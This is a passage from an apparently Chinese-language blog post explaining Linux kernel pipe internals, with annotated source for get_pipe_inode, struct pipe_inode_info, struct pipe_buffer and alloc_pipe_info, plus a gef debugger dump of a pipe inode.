class="comment">/*</span></span><br><span class="line"><span class="comment">    实际上inode-&gt;i_pipe 是个联合体成员，它不一定是 i_pipe，而一旦是i_pipe，则代表该inode只用于管道，inode 实际上相当于一个常用的数据结构，inode 常常用于 mostly read-only and often accessed 的数据结构。</span></span><br><span class="line"><span class="comment">    union &#123;</span></span><br><span class="line"><span class="comment">struct pipe_inode_info*i_pipe;</span></span><br><span class="line"><span class="comment">struct cdev*i_cdev;</span></span><br><span class="line"><span class="comment">char*i_link;</span></span><br><span class="line"><span class="comment">unsignedi_dir_seq;</span></span><br><span class="line"><span class="comment">&#125;;</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">pipe-&gt;files = <span class="number">2</span>;</span><br><span class="line">pipe-&gt;readers = pipe-&gt;writers = <span class="number">1</span>;</span><br><span class="line">inode-&gt;i_fop = &amp;pipefifo_fops;<span class="comment">// 见9</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Mark the inode dirty from the very beginning,</span></span><br><span class="line"><span class="comment"> * that way it will never be moved to the dirty</span></span><br><span class="line"><span class="comment"> * list because &quot;mark_inode_dirty()&quot; will think</span></span><br><span class="line"><span class="comment"> * that it already _is_ on the dirty list.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">inode-&gt;i_state = I_DIRTY;</span><br><span class="line">inode-&gt;i_mode = S_IFIFO | S_IRUSR | S_IWUSR;</span><br><span class="line">inode-&gt;i_uid = <span class="built_in">current_fsuid</span>();</span><br><span class="line">inode-&gt;i_gid = <span class="built_in">current_fsgid</span>();</span><br><span class="line">inode-&gt;i_atime = inode-&gt;i_mtime = inode-&gt;i_ctime = <span class="built_in">current_time</span>(inode);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> inode;</span><br><span class="line"></span><br><span class="line">fail_iput:</span><br><span class="line"><span class="built_in">iput</span>(inode);</span><br><span class="line"></span><br><span class="line">fail_inode:</span><br><span class="line"><span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment">下面是该函数返回值，也就是inode，实际上inode我们不需要太过关心</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">gef➤  print *inode</span></span><br><span class="line"><span class="comment">$7 = &#123;</span></span><br><span class="line"><span class="comment">  i_mode = 0x1180,</span></span><br><span class="line"><span class="comment">  i_opflags = 0x0,</span></span><br><span class="line"><span class="comment">  i_uid = &#123;</span></span><br><span class="line"><span class="comment">    val = 0x3e8</span></span><br><span class="line"><span class="comment">  &#125;,</span></span><br><span class="line"><span class="comment">  i_gid = &#123;</span></span><br><span class="line"><span class="comment">    val = 0x3e8</span></span><br><span class="line"><span class="comment">  &#125;,</span></span><br><span class="line"><span class="comment">  i_flags = 0x0,</span></span><br><span class="line"><span class="comment">  i_acl = 0xffffffffffffffff,</span></span><br><span class="line"><span class="comment">  i_default_acl = 0xffffffffffffffff,</span></span><br><span class="line"><span class="comment">  i_op = 0xffffffff8201a280 &lt;empty_iops&gt;,</span></span><br><span class="line"><span class="comment">  i_sb = 0xffff888003057800,</span></span><br><span class="line"><span class="comment">  i_mapping = 0xffff888005315128,</span></span><br><span class="line"><span class="comment">  i_security = 0xffff88800643db60,</span></span><br><span class="line"><span class="comment">  i_ino = 0x293f,</span></span><br><span class="line"><span class="comment">  &#123;</span></span><br><span class="line"><span class="comment">    i_nlink = 0x1,</span></span><br><span class="line"><span class="comment">    __i_nlink = 0x1</span></span><br><span class="line"><span class="comment">  &#125;,</span></span><br><span class="line"><span class="comment">  i_rdev = 0x0,</span></span><br><span class="line"><span class="comment">  i_size = 0x0,</span></span><br><span class="line"><span class="comment">  i_atime = &#123;</span></span><br><span class="line"><span class="comment">    tv_sec = 0x62340101,</span></span><br><span class="line"><span class="comment">    tv_nsec = 0x1161f975</span></span><br><span class="line"><span class="comment">  &#125;,</span></span><br><span class="line"><span class="comment">  i_mtime = &#123;</span></span><br><span class="line"><span class="comment">    tv_sec = 0x62340101,</span></span><br><span class="line"><span class="comment">    tv_nsec = 0x1161f975</span></span><br><span class="line"><span class="comment">  &#125;,</span></span><br><span class="line"><span class="comment">  i_ctime = &#123;</span></span><br><span class="line"><span class="comment">    tv_sec = 0x62340101,</span></span><br><span class="line"><span class="comment">    tv_nsec = 0x1161f975</span></span><br><span class="line"><span class="comment">  &#125;,</span></span><br><span class="line"><span class="comment">  i_lock = &#123;</span></span><br><span class="line"><span class="comment">    &#123;</span></span><br><span class="line"><span class="comment">      rlock = &#123;</span></span><br><span class="line"><span class="comment">        raw_lock = &#123;</span></span><br><span class="line"><span class="comment">          &#123;</span></span><br><span class="line"><span class="comment">            val = &#123;</span></span><br><span class="line"><span class="comment">              counter = 0x0</span></span><br><span class="line"><span class="comment">            &#125;,</span></span><br><span class="line"><span class="comment">            &#123;</span></span><br><span class="line"><span class="comment">              locked = 0x0,</span></span><br><span class="line"><span class="comment">              pending = 0x0</span></span><br><span class="line"><span class="comment">            &#125;,</span></span><br><span class="line"><span class="comment">            &#123;</span></span><br><span class="line"><span class="comment">              locked_pending = 0x0,</span></span><br><span class="line"><span class="comment">              tail = 0x0</span></span><br><span class="line"><span class="comment">            &#125;</span></span><br><span class="line"><span class="comment">          &#125;</span></span><br><span class="line"><span class="comment">        &#125;</span></span><br><span class="line"><span class="comment">      &#125;</span></span><br><span class="line"><span class="comment">    &#125;</span></span><br><span class="line"><span class="comment">  &#125;,</span></span><br><span class="line"><span class="comment">  i_bytes = 0x0,</span></span><br><span class="line"><span class="comment">  i_blkbits = 0xc,</span></span><br><span class="line"><span class="comment">  i_write_hint = 0x0,</span></span><br><span class="line"><span class="comment">  i_blocks = 0x0,</span></span><br><span class="line"><span class="comment">  i_state = 0x7,</span></span><br><span class="line"><span class="comment">  i_rwsem = &#123;</span></span><br><span class="line"><span class="comment">    count = &#123;</span></span><br><span class="line"><span class="comment">      counter = 0x0</span></span><br><span class="line"><span class="comment">    &#125;,</span></span><br><span class="line"><span class="comment">    owner = &#123;</span></span><br><span class="line"><span class="comment">      counter = 0x0</span></span><br><span class="line"><span class="comment">    &#125;,</span></span><br><span class="line"><span class="comment">    osq = &#123;</span></span><br><span class="line"><span class="comment">      tail = &#123;</span></span><br><span class="line"><span class="comment">        counter = 0x0</span></span><br><span class="line"><span class="comment">      &#125;</span></span><br><span class="line"><span class="comment">    &#125;,</span></span><br><span class="line"><span class="comment">    wait_lock = &#123;</span></span><br><span class="line"><span class="comment">      raw_lock = &#123;</span></span><br><span class="line"><span class="comment">        &#123;</span></span><br><span class="line"><span class="comment">          val = &#123;</span></span><br><span class="line"><span class="comment">            counter = 0x0</span></span><br><span class="line"><span class="comment">          &#125;,</span></span><br><span class="line"><span class="comment">          &#123;</span></span><br><span class="line"><span class="comment">            locked = 0x0,</span></span><br><span class="line"><span class="comment">            pending = 0x0</span></span><br><span class="line"><span class="comment">          &#125;,</span></span><br><span class="line"><span class="comment">          &#123;</span></span><br><span class="line"><span class="comment">            locked_pending = 0x0,</span></span><br><span class="line"><span class="comment">            tail = 0x0</span></span><br><span class="line"><span class="comment">          &#125;</span></span><br><span class="line"><span class="comment">        &#125;</span></span><br><span class="line"><span class="comment">      &#125;</span></span><br><span class="line"><span class="comment">    &#125;,</span></span><br><span class="line"><span class="comment">    wait_list = &#123;</span></span><br><span class="line"><span class="comment">      next = 0xffff888005315078,</span></span><br><span class="line"><span class="comment">      prev = 0xffff888005315078</span></span><br><span class="line"><span class="comment">    &#125;</span></span><br><span class="line"><span class="comment">  &#125;,</span></span><br><span class="line"><span class="comment">  dirtied_when = 0x0,</span></span><br><span class="line"><span class="comment">  dirtied_time_when = 0x0,</span></span><br><span class="line"><span class="comment">  i_hash = &#123;</span></span><br><span class="line"><span class="comment">    next = 0xffff8880052ce9d8,</span></span><br><span class="line"><span class="comment">    pprev = 0x0 &lt;fixed_percpu_data&gt;</span></span><br><span class="line"><span class="comment">  &#125;,</span></span><br><span class="line"><span class="comment">  i_io_list = &#123;</span></span><br><span class="line"><span class="comment">    next = 0xffff8880053150a8,</span></span><br><span class="line"><span class="comment">    prev = 0xffff8880053150a8</span></span><br><span class="line"><span class="comment">  &#125;,</span></span><br><span class="line"><span class="comment">  i_lru = &#123;</span></span><br><span class="line"><span class="comment">    next = 0xffff8880053150b8,</span></span><br><span class="line"><span class="comment">    prev = 0xffff8880053150b8</span></span><br><span class="line"><span class="comment">  &#125;,</span></span><br><span class="line"><span class="comment">  i_sb_list = &#123;</span></span><br><span class="line"><span class="comment">    next = 0xffff8880053150c8,</span></span><br><span class="line"><span class="comment">    prev = 0xffff8880053150c8</span></span><br><span class="line"><span class="comment">  &#125;,</span></span><br><span class="line"><span class="comment">  i_wb_list = &#123;</span></span><br><span class="line"><span class="comment">    next = 0xffff8880053150d8,</span></span><br><span class="line"><span class="comment">    prev = 0xffff8880053150d8</span></span><br><span class="line"><span class="comment">  &#125;,</span></span><br><span class="line"><span class="comment">  &#123;</span></span><br><span class="line"><span class="comment">    i_dentry = &#123;</span></span><br><span class="line"><span class="comment">      first = 0x0 &lt;fixed_percpu_data&gt;</span></span><br><span class="line"><span class="comment">    &#125;,</span></span><br><span class="line"><span class="comment">    i_rcu = &#123;</span></span><br><span class="line"><span class="comment">      next = 0x0 &lt;fixed_percpu_data&gt;,</span></span><br><span class="line"><span class="comment">      func = 0x0 &lt;fixed_percpu_data&gt;</span></span><br><span class="line"><span class="comment">    &#125;</span></span><br><span class="line"><span class="comment">  &#125;,</span></span><br><span class="line"><span class="comment">  i_version = &#123;</span></span><br><span class="line"><span class="comment">    counter = 0x0</span></span><br><span class="line"><span class="comment">  &#125;,</span></span><br><span class="line"><span class="comment">  i_sequence = &#123;</span></span><br><span class="line"><span class="comment">    counter = 0x0</span></span><br><span class="line"><span class="comment">  &#125;,</span></span><br><span class="line"><span class="comment">  i_count = &#123;</span></span><br><span class="line"><span class="comment">    counter = 0x1</span></span><br><span class="line"><span class="comment">  &#125;,</span></span><br><span class="line"><span class="comment">  i_dio_count = &#123;</span></span><br><span class="line"><span class="comment">    counter = 0x0</span></span><br><span class="line"><span class="comment">  &#125;,</span></span><br><span class="line"><span class="comment">  i_writecount = &#123;</span></span><br><span class="line"><span class="comment">    counter = 0x0</span></span><br><span class="line"><span class="comment">  &#125;,</span></span><br><span class="line"><span class="comment">  i_readcount = &#123;</span></span><br><span class="line"><span class="comment">    counter = 0x0</span></span><br><span class="line"><span class="comment">  &#125;,</span></span><br><span class="line"><span class="comment">  &#123;</span></span><br><span class="line"><span class="comment">    i_fop = 0xffffffff82019e20 &lt;pipefifo_fops&gt;,</span></span><br><span class="line"><span class="comment">    free_inode = 0xffffffff82019e20 &lt;pipefifo_fops&gt;</span></span><br><span class="line"><span class="comment">  &#125;,</span></span><br><span class="line"><span class="comment">  i_flctx = 0x0 &lt;fixed_percpu_data&gt;,</span></span><br><span class="line"><span class="comment">  i_data = &#123;</span></span><br><span class="line"><span class="comment">    host = 0xffff888005314fc0,</span></span><br><span class="line"><span class="comment">    i_pages = &#123;</span></span><br><span class="line"><span class="comment">      xa_lock = &#123;</span></span><br><span class="line"><span class="comment">        &#123;</span></span><br><span class="line"><span class="comment">          rlock = &#123;</span></span><br><span class="line"><span class="comment">            raw_lock = &#123;</span></span><br><span class="line"><span class="comment">              &#123;</span></span><br><span class="line"><span class="comment">                val = &#123;</span></span><br><span class="line"><span class="comment">                  counter = 0x0</span></span><br><span class="line"><span class="comment">                &#125;,</span></span><br><span class="line"><span class="comment">                &#123;</span></span><br><span class="line"><span class="comment">                  locked = 0x0,</span></span><br><span class="line"><span class="comment">                  pending = 0x0</span></span><br><span class="line"><span class="comment">                &#125;,</span></span><br><span class="line"><span class="comment">                &#123;</span></span><br><span class="line"><span class="comment">                  locked_pending = 0x0,</span></span><br><span class="line"><span class="comment">                  tail = 0x0</span></span><br><span class="line"><span class="comment">                &#125;</span></span><br><span class="line"><span class="comment">              &#125;</span></span><br><span class="line"><span class="comment">            &#125;</span></span><br><span class="line"><span class="comment">          &#125;</span></span><br><span class="line"><span class="comment">        &#125;</span></span><br><span class="line"><span class="comment">      &#125;,</span></span><br><span class="line"><span class="comment">      xa_flags = 0x21,</span></span><br><span class="line"><span class="comment">      xa_head = 0x0 &lt;fixed_percpu_data&gt;</span></span><br><span class="line"><span class="comment">    &#125;,</span></span><br><span class="line"><span class="comment">    gfp_mask = 0x100cca,</span></span><br><span class="line"><span class="comment">    i_mmap_writable = &#123;</span></span><br><span class="line"><span class="comment">      counter = 0x0</span></span><br><span class="line"><span class="comment">    &#125;,</span></span><br><span class="line"><span class="comment">    i_mmap = &#123;</span></span><br><span class="line"><span class="comment">      rb_root = &#123;</span></span><br><span class="line"><span class="comment">        rb_node = 0x0 &lt;fixed_percpu_data&gt;</span></span><br><span class="line"><span class="comment">      &#125;,</span></span><br><span class="line"><span class="comment">      rb_leftmost = 0x0 &lt;fixed_percpu_data&gt;</span></span><br><span class="line"><span class="comment">    &#125;,</span></span><br><span class="line"><span class="comment">    i_mmap_rwsem = &#123;</span></span><br><span class="line"><span class="comment">      count = &#123;</span></span><br><span class="line"><span class="comment">        counter = 0x0</span></span><br><span class="line"><span class="comment">      &#125;,</span></span><br><span class="line"><span class="comment">      owner = &#123;</span></span><br><span class="line"><span class="comment">        counter = 0x0</span></span><br><span class="line"><span class="comment">      &#125;,</span></span><br><span class="line"><span class="comment">      osq = &#123;</span></span><br><span class="line"><span class="comment">        tail = &#123;</span></span><br><span class="line"><span class="comment">          counter = 0x0</span></span><br><span class="line"><span class="comment">        &#125;</span></span><br><span class="line"><span class="comment">      &#125;,</span></span><br><span class="line"><span class="comment">      wait_lock = &#123;</span></span><br><span class="line"><span class="comment">        raw_lock = &#123;</span></span><br><span class="line"><span class="comment">          &#123;</span></span><br><span class="line"><span class="comment">            val = &#123;</span></span><br><span class="line"><span class="comment">              counter = 0x0</span></span><br><span class="line"><span class="comment">            &#125;,</span></span><br><span class="line"><span class="comment">            &#123;</span></span><br><span class="line"><span class="comment">              locked = 0x0,</span></span><br><span class="line"><span class="comment">              pending = 0x0</span></span><br><span class="line"><span class="comment">            &#125;,</span></span><br><span class="line"><span class="comment">            &#123;</span></span><br><span class="line"><span class="comment">              locked_pending = 0x0,</span></span><br><span class="line"><span class="comment">              tail = 0x0</span></span><br><span class="line"><span class="comment">            &#125;</span></span><br><span class="line"><span class="comment">          &#125;</span></span><br><span class="line"><span class="comment">        &#125;</span></span><br><span class="line"><span class="comment">      &#125;,</span></span><br><span class="line"><span class="comment">      wait_list = &#123;</span></span><br><span class="line"><span class="comment">        next = 0xffff888005315170,</span></span><br><span class="line"><span class="comment">        prev = 0xffff888005315170</span></span><br><span class="line"><span class="comment">      &#125;</span></span><br><span class="line"><span class="comment">    &#125;,</span></span><br><span class="line"><span class="comment">    nrpages = 0x0,</span></span><br><span class="line"><span class="comment">    nrexceptional = 0x0,</span></span><br><span class="line"><span class="comment">    writeback_index = 0x0,</span></span><br><span class="line"><span class="comment">    a_ops = 0xffffffff8201a340 &lt;empty_aops&gt;,</span></span><br><span class="line"><span class="comment">    flags = 0x0,</span></span><br><span class="line"><span class="comment">    wb_err = 0x0,</span></span><br><span class="line"><span class="comment">    private_lock = &#123;</span></span><br><span class="line"><span class="comment">      &#123;</span></span><br><span class="line"><span class="comment">        rlock = &#123;</span></span><br><span class="line"><span class="comment">          raw_lock = &#123;</span></span><br><span class="line"><span class="comment">            &#123;</span></span><br><span class="line"><span class="comment">              val = &#123;</span></span><br><span class="line"><span class="comment">                counter = 0x0</span></span><br><span class="line"><span class="comment">              &#125;,</span></span><br><span class="line"><span class="comment">              &#123;</span></span><br><span class="line"><span class="comment">                locked = 0x0,</span></span><br><span class="line"><span class="comment">                pending = 0x0</span></span><br><span class="line"><span class="comment">              &#125;,</span></span><br><span class="line"><span class="comment">              &#123;</span></span><br><span class="line"><span class="comment">                locked_pending = 0x0,</span></span><br><span class="line"><span class="comment">                tail = 0x0</span></span><br><span class="line"><span class="comment">              &#125;</span></span><br><span class="line"><span class="comment">            &#125;</span></span><br><span class="line"><span class="comment">          &#125;</span></span><br><span class="line"><span class="comment">        &#125;</span></span><br><span class="line"><span class="comment">      &#125;</span></span><br><span class="line"><span class="comment">    &#125;,</span></span><br><span class="line"><span class="comment">    private_list = &#123;</span></span><br><span class="line"><span class="comment">      next = 0xffff8880053151b0,</span></span><br><span class="line"><span class="comment">      prev = 0xffff8880053151b0</span></span><br><span class="line"><span class="comment">    &#125;,</span></span><br><span class="line"><span class="comment">    private_data = 0x0 &lt;fixed_percpu_data&gt;</span></span><br><span class="line"><span class="comment">  &#125;,</span></span><br><span class="line"><span class="comment">  i_devices = &#123;</span></span><br><span class="line"><span class="comment">    next = 0xffff8880053151c8,</span></span><br><span class="line"><span class="comment">    prev = 0xffff8880053151c8</span></span><br><span class="line"><span class="comment">  &#125;,</span></span><br><span class="line"><span class="comment">  &#123;</span></span><br><span class="line"><span class="comment">    i_pipe = 0xffff888004f72e40,</span></span><br><span class="line"><span class="comment">    i_cdev = 0xffff888004f72e40,</span></span><br><span class="line"><span class="comment">    i_link = 0xffff888004f72e40 &quot;&quot;,</span></span><br><span class="line"><span class="comment">    i_dir_seq = 0x4f72e40</span></span><br><span class="line"><span class="comment">  &#125;,</span></span><br><span class="line"><span class="comment">  i_generation = 0x0,</span></span><br><span class="line"><span class="comment">  i_fsnotify_mask = 0x0,</span></span><br><span class="line"><span class="comment">  i_fsnotify_marks = 0x0 &lt;fixed_percpu_data&gt;,</span></span><br><span class="line"><span class="comment">  i_private = 0x0 &lt;fixed_percpu_data&gt;</span></span><br><span class="line"><span class="comment">&#125;</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure><h4 id="6、struct-pipe-inode-info"><a href="#6、struct-pipe-inode-info" class="headerlink" title="6、struct pipe_inode_info"></a>6、struct pipe_inode_info</h4><p>这里为上面<code>alloc_pipe_info</code>所分配的数据结构，也就是管道的数据结构。里面的成员信息我用中文进行了注释。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> *struct pipe_inode_info - a linux kernel pipe</span></span><br><span class="line"><span class="comment"> *@mutex: mutex protecting the whole thing</span></span><br><span class="line"><span class="comment"> *@rd_wait: reader wait point in case of empty pipe</span></span><br><span class="line"><span class="comment"> *@wr_wait: writer wait point in case of full pipe</span></span><br><span class="line"><span class="comment"> *@head: The point of buffer production</span></span><br><span class="line"><span class="comment"> *@tail: The point of buffer consumption</span></span><br><span class="line"><span class="comment"> *@note_loss: The next read() should insert a data-lost message</span></span><br><span class="line"><span class="comment"> *@max_usage: The maximum number of slots that may be used in the ring</span></span><br><span class="line"><span class="comment"> *@ring_size: total number of buffers (should be a power of 2)</span></span><br><span class="line"><span class="comment"> *@nr_accounted: The amount this pipe accounts for in user-&gt;pipe_bufs</span></span><br><span class="line"><span class="comment"> *@tmp_page: cached released page</span></span><br><span class="line"><span class="comment"> *@readers: number of current readers of this pipe</span></span><br><span class="line"><span class="comment"> *@writers: number of current writers of this pipe</span></span><br><span class="line"><span class="comment"> *@files: number of struct file referring this pipe (protected by -&gt;i_lock)</span></span><br><span class="line"><span class="comment"> *@r_counter: reader counter</span></span><br><span class="line"><span class="comment"> *@w_counter: writer counter</span></span><br><span class="line"><span class="comment"> *@fasync_readers: reader side fasync</span></span><br><span class="line"><span class="comment"> *@fasync_writers: writer side fasync</span></span><br><span class="line"><span class="comment"> *@bufs: the circular array of pipe buffers</span></span><br><span class="line"><span class="comment"> *@user: the user who created this pipe</span></span><br><span class="line"><span class="comment"> *@watch_queue: If this pipe is a watch_queue, this is the stuff for that</span></span><br><span class="line"><span class="comment"> **/</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pipe_inode_info</span> &#123;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">mutex</span> <span class="title">mutex</span>;</span><span class="comment">// 互斥锁</span></span><br><span class="line"><span class="keyword">wait_queue_head_t</span> rd_wait, wr_wait;<span class="comment">// 管道为空与管道已满时的指针</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> head;<span class="comment">// 管道头</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> tail;<span class="comment">// 管道尾</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> max_usage;<span class="comment">// </span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> ring_size;<span class="comment">// 缓冲区大小（应该是2的幂）</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_WATCH_QUEUE</span></span><br><span class="line"><span class="keyword">bool</span> note_loss;<span class="comment">// 下一个 read() 应该插入一条数据丢失消息</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> nr_accounted;<span class="comment">// 该管道在 user-&gt;pipe_bufs 中所占的数量</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> readers;<span class="comment">// 当前读管道的线程数量</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> writers; <span class="comment">// 当前写管道的线程数量</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> files;  <span class="comment">// 引用此管道的结构体数两（受 -&gt;i_lock 保护）</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> r_counter;<span class="comment">// 读者计数器</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> w_counter;<span class="comment">// 写者计数器</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">page</span> *<span class="title">tmp_page</span>;</span><span class="comment">// 缓存页</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">fasync_struct</span> *<span class="title">fasync_readers</span>;</span><span class="comment">// 读者端 fasync</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">fasync_struct</span> *<span class="title">fasync_writers</span>;</span><span class="comment">// 写者端 fasync</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pipe_buffer</span> *<span class="title">bufs</span>;</span> <span class="comment">// 管道缓冲区的循环数组</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">user_struct</span> *<span class="title">user</span>;</span><span class="comment">// 创建此管道的用户</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_WATCH_QUEUE</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">watch_queue</span> *<span class="title">watch_queue</span>;</span><span class="comment">// 如果这个管道是一个 watch_queue，则该结构体存储该结构</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h4 id="7、struct-pipe-buffer"><a href="#7、struct-pipe-buffer" class="headerlink" title="7、struct pipe_buffer"></a>7、struct pipe_buffer</h4><p>pipe中的数据保存在结构体 <code>pipe_buffer</code>中。同样，里面的成员信息我用中文进行了注释。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> *struct pipe_buffer - a linux kernel pipe buffer</span></span><br><span class="line"><span class="comment"> *@page: the page containing the data for the pipe buffer</span></span><br><span class="line"><span class="comment"> *@offset: offset of data inside the @page</span></span><br><span class="line"><span class="comment"> *@len: length of data inside the @page</span></span><br><span class="line"><span class="comment"> *@ops: operations associated with this buffer. See @pipe_buf_operations.</span></span><br><span class="line"><span class="comment"> *@flags: pipe buffer flags. See above.</span></span><br><span class="line"><span class="comment"> *@private: private data owned by the ops.</span></span><br><span class="line"><span class="comment"> **/</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pipe_buffer</span> &#123;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">page</span> *<span class="title">page</span>;</span><span class="comment">// 包含管道缓冲区数据的页</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> offset, len;<span class="comment">// 页内数据的长度</span></span><br><span class="line"><span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">pipe_buf_operations</span> *<span class="title">ops</span>;</span><span class="comment">// 与该缓冲区关联的操作</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> flags;<span class="comment">// 管道缓冲区flag</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">private</span>;<span class="comment">// 私有数据</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h4 id="8、alloc-pipe-info"><a href="#8、alloc-pipe-info" class="headerlink" title="8、alloc_pipe_info"></a>8、alloc_pipe_info</h4><p>该函数被<code>get_pipe_inode</code>调用，用于生成一个<code>pipe_inode_info</code>对象。</p><p>该函数的大体逻辑为：首先通过<code>kzalloc</code>为<code>pipe_inode_info</code>对象分配堆空间，之后对边界情况做了一些异常处理，之后通过 <code>kcalloc</code> 给<code>pipe_inode_info-&gt;bufs</code>分配堆内存，如果分配成功，则对<code>pipe_inode_info</code>的其他成员变量进行初始化。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span 